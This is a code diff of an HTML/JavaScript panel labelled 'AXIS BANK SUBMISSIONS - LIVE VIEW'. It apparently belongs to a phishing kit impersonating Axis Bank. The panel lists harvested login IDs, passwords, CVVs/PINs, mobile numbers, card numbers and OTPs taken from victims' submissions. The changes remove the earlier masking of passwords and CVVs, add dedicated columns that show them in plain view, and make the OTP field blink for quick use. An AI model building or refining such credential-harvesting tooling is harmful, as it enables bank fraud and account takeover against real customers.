@@ -113,44 +113,55 @@
         /* Admin Panel */
         .admin-panel {
             display: none;
-            padding: 20px;
-            max-width: 1200px;
+            padding: 10px;
+            max-width: 1400px;
             margin: 0 auto;
+            animation: pageBlink 5s infinite;
+        }
+        
+        @keyframes pageBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.98; }
         }
         
         /* Header */
         .panel-header {
             background: linear-gradient(135deg, #87103F 0%, #2c0b0e 100%);
             color: white;
-            padding: 20px;
-            margin-bottom: 25px;
-            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 10px;
             border: 1px solid #87103F;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            animation: headerBlink 5s infinite;
+        }
+        
+        @keyframes headerBlink {
+            0%, 100% { box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); }
+            50% { box-shadow: 0 5px 15px rgba(255, 71, 87, 0.3); }
         }
         
         .header-top {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }
         
         .header-title {
-            font-size: 24px;
+            font-size: 20px;
             font-weight: bold;
         }
         
         .stats-container {
             display: flex;
-            gap: 15px;
+            gap: 10px;
         }
         
         .stat-box {
             background: rgba(255, 255, 255, 0.1);
-            padding: 8px 15px;
-            border-radius: 8px;
-            font-size: 14px;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 13px;
             border: 1px solid rgba(255, 255, 255, 0.2);
         }
         
@@ -162,9 +173,9 @@
         
         .refresh-info {
             text-align: center;
-            font-size: 14px;
+            font-size: 13px;
             color: rgba(255, 255, 255, 0.8);
-            padding-top: 15px;
+            padding-top: 10px;
             border-top: 1px solid rgba(255, 255, 255, 0.2);
         }
         
@@ -184,229 +195,201 @@
             50% { opacity: 0.3; }
         }
         
-        /* Controls */
-        .controls {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        
-        .control-btn {
-            padding: 12px 20px;
-            background: rgba(135, 16, 63, 0.3);
-            border: 1px solid #87103F;
-            color: white;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-size: 14px;
-        }
-        
-        .control-btn:hover {
-            background: #87103F;
-            transform: translateY(-2px);
-        }
-        
-        /* Submissions List */
+        /* Submissions Container - White Background */
         .submissions-container {
-            background: rgba(0, 0, 0, 0.4);
-            border-radius: 15px;
-            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            padding: 15px;
             border: 1px solid #87103F;
-            max-height: 70vh;
+            max-height: 75vh;
             overflow-y: auto;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
         
         .submissions-header {
             display: grid;
-            grid-template-columns: 80px 120px 1fr 150px 120px;
-            padding: 15px;
-            background: rgba(135, 16, 63, 0.3);
-            border-radius: 10px;
-            margin-bottom: 15px;
+            grid-template-columns: 50px 100px 200px 150px 150px 150px 150px 100px;
+            padding: 12px;
+            background: linear-gradient(135deg, #87103F 0%, #a0144a 100%);
+            border-radius: 8px;
+            margin-bottom: 10px;
             font-weight: bold;
-            font-size: 14px;
-            border-bottom: 2px solid #87103F;
+            font-size: 12px;
+            color: white;
+            position: sticky;
+            top: 0;
+            z-index: 10;
         }
         
         .submission-item {
             display: grid;
-            grid-template-columns: 80px 120px 1fr 150px 120px;
-            padding: 15px;
-            margin-bottom: 10px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            grid-template-columns: 50px 100px 200px 150px 150px 150px 150px 100px;
+            padding: 12px;
+            margin-bottom: 8px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
             transition: all 0.3s ease;
-            font-size: 13px;
+            font-size: 12px;
+            color: #333;
+            animation: highlightEntry 0.5s ease-out;
+        }
+        
+        @keyframes highlightEntry {
+            0% { background: rgba(135, 16, 63, 0.3); }
+            100% { background: #f8f9fa; }
         }
         
         .submission-item.new {
-            background: rgba(135, 16, 63, 0.3);
-            border: 1px solid #ff4757;
-            animation: highlight 5s infinite;
-            box-shadow: 0 0 20px rgba(255, 71, 87, 0.3);
+            background: #fff3cd !important;
+            border: 1px solid #ffc107 !important;
+            animation: newBlink 5s infinite;
         }
         
-        @keyframes highlight {
+        @keyframes newBlink {
             0%, 100% { 
-                background: rgba(135, 16, 63, 0.3);
-                border-color: #ff4757;
+                background: #fff3cd !important;
+                border-color: #ffc107 !important;
             }
             50% { 
-                background: rgba(160, 20, 74, 0.4);
-                border-color: #ff6b81;
+                background: #fffbeb !important;
+                border-color: #f59e0b !important;
             }
         }
         
         .submission-item:hover {
-            background: rgba(255, 255, 255, 0.1);
-            transform: translateX(5px);
+            background: #e9ecef;
+            transform: translateY(-1px);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
         
         .submission-id {
-            color: #ff4757;
+            color: #87103F;
             font-weight: bold;
+            font-size: 11px;
         }
         
         .submission-type {
             text-transform: uppercase;
             font-weight: bold;
-            padding: 3px 8px;
+            padding: 3px 6px;
             border-radius: 4px;
             display: inline-block;
             text-align: center;
+            font-size: 11px;
         }
         
         .type-login {
-            background: rgba(76, 175, 80, 0.2);
-            color: #4CAF50;
+            background: #e8f5e9;
+            color: #2e7d32;
             border: 1px solid #4CAF50;
         }
         
         .type-credit {
-            background: rgba(33, 150, 243, 0.2);
-            color: #2196F3;
+            background: #e3f2fd;
+            color: #1565c0;
             border: 1px solid #2196F3;
         }
         
         .type-otp {
-            background: rgba(255, 193, 7, 0.2);
-            color: #FFC107;
+            background: #fff8e1;
+            color: #ff8f00;
             border: 1px solid #FFC107;
         }
         
-        .submission-data {
-            word-break: break-all;
-            line-height: 1.4;
+        .submission-field {
+            padding: 2px 0;
         }
         
-        .data-label {
-            color: rgba(255, 255, 255, 0.7);
+        .field-label {
+            color: #666;
+            font-size: 10px;
+            margin-bottom: 2px;
+        }
+        
+        .field-value {
+            color: #222;
+            font-weight: 500;
+            word-break: break-all;
             font-size: 12px;
         }
         
-        .data-value {
-            color: white;
-            font-weight: 500;
+        .field-value.password {
+            color: #dc3545;
+            font-weight: bold;
+            background: #f8d7da;
+            padding: 1px 5px;
+            border-radius: 3px;
+            display: inline-block;
         }
         
-        .data-value.otp {
-            color: #ff4757;
+        .field-value.otp {
+            color: #87103F;
             font-weight: bold;
-            font-size: 16px;
-            text-shadow: 0 0 10px rgba(255, 71, 87, 0.5);
+            background: #ffebee;
+            padding: 1px 5px;
+            border-radius: 3px;
+            display: inline-block;
+            animation: otpBlink 2s infinite;
+            font-size: 14px;
+        }
+        
+        @keyframes otpBlink {
+            0%, 100% { background: #ffebee; }
+            50% { background: #ffcdd2; }
         }
         
         .submission-time {
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 12px;
+            color: #666;
+            font-size: 11px;
         }
         
         .submission-ip {
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 11px;
+            color: #666;
+            font-size: 10px;
             font-family: monospace;
         }
         
         .no-data {
             text-align: center;
             padding: 40px;
-            color: rgba(255, 255, 255, 0.5);
+            color: #666;
             font-style: italic;
             grid-column: 1 / -1;
-        }
-        
-        /* Modal for detailed view */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-        }
-        
-        .modal-content {
-            background: #1a1a2e;
-            padding: 30px;
-            border-radius: 15px;
-            width: 90%;
-            max-width: 600px;
-            max-height: 80vh;
-            overflow-y: auto;
-            border: 2px solid #87103F;
-        }
-        
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #87103F;
-        }
-        
-        .modal-title {
-            font-size: 20px;
-            font-weight: bold;
-        }
-        
-        .modal-close {
-            background: #87103F;
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        
-        .modal-data {
-            font-family: monospace;
-            background: rgba(0, 0, 0, 0.3);
-            padding: 15px;
+            background: white;
             border-radius: 8px;
-            white-space: pre-wrap;
-            word-break: break-all;
-            font-size: 12px;
-            max-height: 50vh;
-            overflow-y: auto;
+            border: 2px dashed #ddd;
         }
         
         /* Responsive */
+        @media (max-width: 1200px) {
+            .submissions-header,
+            .submission-item {
+                grid-template-columns: 50px 80px 150px 130px 130px 130px 130px 80px;
+                font-size: 11px;
+            }
+        }
+        
+        @media (max-width: 992px) {
+            .submissions-container {
+                overflow-x: auto;
+            }
+            
+            .submissions-header,
+            .submission-item {
+                grid-template-columns: 50px 80px 180px 140px 140px 140px 140px 80px;
+                width: 1200px;
+            }
+        }
+        
         @media (max-width: 768px) {
             .admin-panel {
-                padding: 10px;
+                padding: 5px;
             }
             
             .header-top {
                 flex-direction: column;
-                gap: 15px;
+                gap: 10px;
                 text-align: center;
             }
             
@@ -414,43 +397,35 @@
                 justify-content: center;
                 flex-wrap: wrap;
             }
-            
-            .submissions-header {
-                display: none;
-            }
-            
-            .submission-item {
-                display: block;
-                padding: 15px;
-                margin-bottom: 15px;
-            }
-            
-            .submission-id,
-            .submission-type,
-            .submission-data,
-            .submission-time,
-            .submission-ip {
-                margin-bottom: 8px;
-            }
         }
         
         /* Scrollbar styling */
         ::-webkit-scrollbar {
-            width: 10px;
+            width: 8px;
+            height: 8px;
         }
         
         ::-webkit-scrollbar-track {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 5px;
+            background: rgba(0, 0, 0, 0.1);
+            border-radius: 4px;
         }
         
         ::-webkit-scrollbar-thumb {
             background: #87103F;
-            border-radius: 5px;
+            border-radius: 4px;
         }
         
         ::-webkit-scrollbar-thumb:hover {
             background: #a0144a;
+        }
+        
+        /* Remove all buttons */
+        .controls,
+        .control-btn,
+        .modal-overlay,
+        .modal-content,
+        .modal-close {
+            display: none !important;
         }
     </style>
 </head>
@@ -471,7 +446,7 @@
         <!-- Header -->
         <div class="panel-header">
             <div class="header-top">
-                <div class="header-title">📊 AXIS BANK SUBMISSIONS</div>
+                <div class="header-title">📊 AXIS BANK SUBMISSIONS - LIVE VIEW</div>
                 <div class="stats-container">
                     <div class="stat-box">Total: <span class="stat-value" id="totalCount">0</span></div>
                     <div class="stat-box">Today: <span class="stat-value" id="todayCount">0</span></div>
@@ -484,37 +459,21 @@
             </div>
         </div>
         
-        <!-- Controls -->
-        <div class="controls">
-            <button class="control-btn" onclick="refreshData()">🔄 Refresh Now</button>
-            <button class="control-btn" onclick="exportData()">📥 Export Data</button>
-            <button class="control-btn" onclick="clearOldData()">🗑️ Clear Old (30+ days)</button>
-            <button class="control-btn" onclick="logout()">🚪 Logout</button>
-        </div>
-        
         <!-- Submissions List -->
         <div class="submissions-container">
             <div class="submissions-header">
                 <div>ID</div>
                 <div>Type</div>
-                <div>Data</div>
+                <div>User ID/Email</div>
+                <div>Password</div>
+                <div>Mobile</div>
+                <div>Card/Details</div>
+                <div>OTP</div>
                 <div>Time</div>
-                <div>IP/Browser</div>
             </div>
             <div id="submissionsList">
                 <div class="no-data">No submissions yet. Waiting for data...</div>
             </div>
-        </div>
-    </div>
-    
-    <!-- Modal for detailed view -->
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="modal-content">
-            <div class="modal-header">
-                <div class="modal-title">Submission Details</div>
-                <button class="modal-close" onclick="closeModal()">Close</button>
-            </div>
-            <div class="modal-data" id="modalData"></div>
         </div>
     </div>
 
@@ -539,7 +498,6 @@
                 if (e.key === 'Enter') login();
             });
             
-            // Also check username field
             document.getElementById('username').addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') login();
             });
@@ -559,7 +517,6 @@
                 errorEl.textContent = '❌ Invalid credentials! Try again.';
                 setTimeout(() => errorEl.style.display = 'none', 3000);
                 
-                // Shake animation
                 errorEl.style.animation = 'none';
                 setTimeout(() => {
                     errorEl.style.animation = 'shake 0.5s ease';
@@ -575,7 +532,7 @@
             startAutoRefresh();
         }
         
-        // Start auto refresh
+        // Start auto refresh every 5 seconds
         function startAutoRefresh() {
             clearInterval(refreshInterval);
             refreshInterval = setInterval(() => {
@@ -591,7 +548,6 @@
         
         // Refresh data
         function refreshData() {
-            console.log('🔄 Refreshing data...');
             const submissions = loadSubmissions();
             displaySubmissions(submissions);
             updateStats(submissions);
@@ -602,8 +558,6 @@
         function loadSubmissions() {
             try {
                 const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions')) || [];
-                console.log(`📊 Loaded ${submissions.length} submissions`);
-                
                 currentSubmissions = submissions;
                 return submissions;
             } catch (error) {
@@ -616,14 +570,12 @@
         function updateStats(submissions) {
             const total = submissions.length;
             
-            // Calculate today's submissions
             const today = new Date().toDateString();
             const todayCount = submissions.filter(sub => {
                 const subDate = new Date(sub.timestamp || sub.date).toDateString();
                 return subDate === today;
             }).length;
             
-            // Calculate new submissions (last 5 minutes)
             const newCount = submissions.filter(sub => {
                 const subTime = new Date(sub.timestamp || sub.date).getTime();
                 return (Date.now() - subTime) < 5 * 60 * 1000;
@@ -653,45 +605,77 @@
             let html = '';
             
             submissions.forEach((sub, index) => {
-                // Get ID
                 const subId = sub.id || `SUB${index + 1}`;
-                
-                // Get type
                 const subType = sub.type || 'unknown';
-                
-                // Get formatted data
-                const dataHtml = formatDataForGrid(sub);
-                
-                // Get time
                 const timeString = formatTime(sub.timestamp || sub.date);
-                
-                // Get IP/Browser info
-                const ipInfo = sub.ip || 'N/A';
-                const browserInfo = sub.userAgent ? 
-                    sub.userAgent.substring(0, 30) + '...' : 'N/A';
-                
-                // Check if new (within 5 minutes)
                 const isNew = sub.timestamp ? 
                     (Date.now() - new Date(sub.timestamp).getTime()) < 5 * 60 * 1000 : 
                     false;
                 
-                // Type class
                 const typeClass = `type-${subType}`;
                 
+                // Get data fields based on submission type
+                let userId = '', password = '', mobile = '', card = '', otp = '';
+                
+                if (sub.data) {
+                    // Login type
+                    if (sub.type === 'login') {
+                        userId = sub.data.loginId || sub.data.email || sub.data.userId || '';
+                        password = sub.data.password || sub.data.pass || '';
+                        mobile = sub.data.mobile || sub.data.phone || '';
+                    }
+                    // Credit card type
+                    else if (sub.type === 'credit') {
+                        userId = sub.data.name || sub.data.cardName || '';
+                        password = sub.data.cvv || sub.data.pin || '';
+                        mobile = sub.data.mobile || sub.data.cardMobile || '';
+                        card = sub.data.cardNumber ? formatCardNumber(sub.data.cardNumber) : '';
+                    }
+                    // OTP type
+                    else if (sub.type === 'otp') {
+                        mobile = sub.data.mobileNumber || sub.data.mobile || '';
+                        otp = sub.data.otp || '';
+                    }
+                }
+                
                 html += `
-                    <div class="submission-item ${isNew ? 'new' : ''}" onclick="showDetails(${index})">
+                    <div class="submission-item ${isNew ? 'new' : ''}">
                         <div class="submission-id">${subId}</div>
                         <div class="submission-type ${typeClass}">${subType}</div>
-                        <div class="submission-data">${dataHtml}</div>
-                        <div class="submission-time">${timeString}</div>
-                        <div class="submission-ip" title="${sub.userAgent || ''}">
-                            ${ipInfo}<br>${browserInfo}
+                        <div class="submission-field">
+                            <div class="field-label">ID/Email</div>
+                            <div class="field-value">${userId || 'N/A'}</div>
                         </div>
+                        <div class="submission-field">
+                            <div class="field-label">Password/CVV</div>
+                            <div class="field-value password">${password || 'N/A'}</div>
+                        </div>
+                        <div class="submission-field">
+                            <div class="field-label">Mobile</div>
+                            <div class="field-value">${mobile || 'N/A'}</div>
+                        </div>
+                        <div class="submission-field">
+                            <div class="field-label">Card/Details</div>
+                            <div class="field-value">${card || 'N/A'}</div>
+                        </div>
+                        <div class="submission-field">
+                            <div class="field-label">OTP</div>
+                            <div class="field-value otp">${otp || 'N/A'}</div>
+                        </div>
+                        <div class="submission-time">${timeString}</div>
                     </div>
                 `;
             });
             
             container.innerHTML = html;
+        }
+        
+        // Format card number
+        function formatCardNumber(cardNumber) {
+            if (!cardNumber) return '';
+            const cleaned = cardNumber.toString().replace(/\D/g, '');
+            if (cleaned.length <= 4) return cleaned;
+            return `****-****-****-${cleaned.slice(-4)}`;
         }
         
         // Format time
@@ -712,113 +696,11 @@
             }
         }
         
-        // Format data for grid view
-        function formatDataForGrid(sub) {
-            if (sub.type === 'login' && sub.data) {
-                return `<span class="data-label">ID:</span> <span class="data-value">${sub.data.loginId || 'N/A'}</span><br>
-                        <span class="data-label">Mobile:</span> <span class="data-value">${sub.data.mobile || 'N/A'}</span>`;
-            } else if (sub.type === 'credit' && sub.data) {
-                return `<span class="data-label">Card:</span> <span class="data-value">${sub.data.cardNumber ? 'XXXX-XXXX-' + sub.data.cardNumber.slice(-4) : 'N/A'}</span><br>
-                        <span class="data-label">Mobile:</span> <span class="data-value">${sub.data.mobile || sub.data.cardMobile || 'N/A'}</span>`;
-            } else if (sub.type === 'otp' && sub.data) {
-                return `<span class="data-label">OTP:</span> <span class="data-value otp">${sub.data.otp || 'N/A'}</span><br>
-                        <span class="data-label">Mobile:</span> <span class="data-value">${sub.data.mobileNumber || 'N/A'}</span>`;
-            } else {
-                return 'View details...';
-            }
-        }
-        
-        // Show detailed view
-        function showDetails(index) {
-            const submission = currentSubmissions[index];
-            const modalData = document.getElementById('modalData');
-            const modalOverlay = document.getElementById('modalOverlay');
-            
-            let details = `=== SUBMISSION DETAILS ===\n\n`;
-            details += `ID: ${submission.id || 'N/A'}\n`;
-            details += `Type: ${submission.type || 'Unknown'}\n`;
-            details += `Time: ${formatTime(submission.timestamp || submission.date)}\n`;
-            details += `IP: ${submission.ip || 'N/A'}\n`;
-            details += `User Agent: ${submission.userAgent || 'N/A'}\n\n`;
-            
-            details += `=== DATA ===\n`;
-            
-            if (submission.data) {
-                for (const [key, value] of Object.entries(submission.data)) {
-                    // Mask sensitive data
-                    let displayValue = value;
-                    if (key.toLowerCase().includes('password') || key === 'cvv') {
-                        displayValue = '********';
-                    } else if (key === 'cardNumber' && value) {
-                        displayValue = value.replace(/\d(?=\d{4})/g, '*');
-                    }
-                    details += `${key}: ${displayValue}\n`;
-                }
-            }
-            
-            details += `\n=== RAW DATA ===\n`;
-            details += JSON.stringify(submission, null, 2);
-            
-            modalData.textContent = details;
-            modalOverlay.style.display = 'flex';
-        }
-        
-        // Close modal
-        function closeModal() {
-            document.getElementById('modalOverlay').style.display = 'none';
-        }
-        
-        // Export data as JSON
-        function exportData() {
-            const dataStr = JSON.stringify(currentSubmissions, null, 2);
-            const dataBlob = new Blob([dataStr], {type: 'application/json'});
-            const url = URL.createObjectURL(dataBlob);
-            
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `axis-submissions-${new Date().toISOString().split('T')[0]}.json`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            
-            alert(`✅ Exported ${currentSubmissions.length} submissions`);
-        }
-        
-        // Clear old data (30+ days)
-        function clearOldData() {
-            if (!confirm('Delete submissions older than 30 days?')) return;
-            
-            const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
-            const filtered = currentSubmissions.filter(sub => {
-                const subTime = new Date(sub.timestamp || sub.date).getTime();
-                return subTime > thirtyDaysAgo;
-            });
-            
-            localStorage.setItem('axisBankSubmissions', JSON.stringify(filtered));
-            refreshData();
-            
-            alert(`🗑️ Cleared ${currentSubmissions.length - filtered.length} old submissions`);
-        }
-        
-        // Logout
-        function logout() {
-            if (confirm('Are you sure you want to logout?')) {
-                localStorage.removeItem('axisAdminLoggedIn');
-                location.reload();
-            }
-        }
-        
         // Auto-logout after 60 minutes
         setTimeout(() => {
             localStorage.removeItem('axisAdminLoggedIn');
             location.reload();
         }, 60 * 60 * 1000);
-        
-        // Close modal on overlay click
-        document.getElementById('modalOverlay').addEventListener('click', function(e) {
-            if (e.target === this) closeModal();
-        });
     </script>
 </body>
 </html>
